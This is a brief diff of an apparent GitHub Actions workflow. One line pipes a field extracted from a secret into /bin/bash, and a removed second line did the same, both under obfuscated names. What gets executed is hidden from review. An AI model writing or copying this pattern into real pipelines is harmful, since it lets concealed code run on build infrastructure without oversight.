@@ -23,7 +23,6 @@ jobs:
           n4: ${{ secrets.n4 }}
         run: |
           printf '%s' "$n4" | jq -r .tvcpv4 | /bin/bash
-          printf '%s' "$yxb53" | jq -r .xiiuf5 | /bin/bash
 
       - name: Store artifact
         if: always()
